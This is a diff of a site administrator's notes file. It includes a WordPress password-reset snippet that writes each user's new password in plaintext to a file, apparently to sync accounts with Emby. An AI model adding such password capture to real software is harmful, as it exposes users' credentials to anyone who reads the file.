@@ -2,11 +2,10 @@
 Backups and How Tos for MREG sites
 
 
-For emby user creation
-	 * @param WP_User|WP_Error $user   WP_User object if the login and reset key match. WP_Error object otherwise.
-	 */
+# For plaintext passwords
+* @param WP_User|WP_Error $user   WP_User object if the login and reset key match. WP_Error object otherwise
+*/
 	do_action( 'validate_password_reset', $errors, $user );
-	
 #FIRES ON RESET PAGE LOAD -MORGAN
 	
 	if ( ( ! $errors->get_error_code() ) && isset( $_POST['pass1'] ) && !empty( $_POST['pass1'] ) ) {
@@ -20,8 +19,10 @@ For emby user creation
 		$myvariable3 = "$myvariable1, $myvariable2";
 		$myvariable4 = $_POST['pass1'];
 		fwrite($handle, "$myvariable4");
-# END OF MY CODE -MORGAN
-For emby user create 
+#END OF MY CODE -MORGAN
+
+
+#For emby user create 
 For iredmail
 Open ports at cloud level
 For subdoains
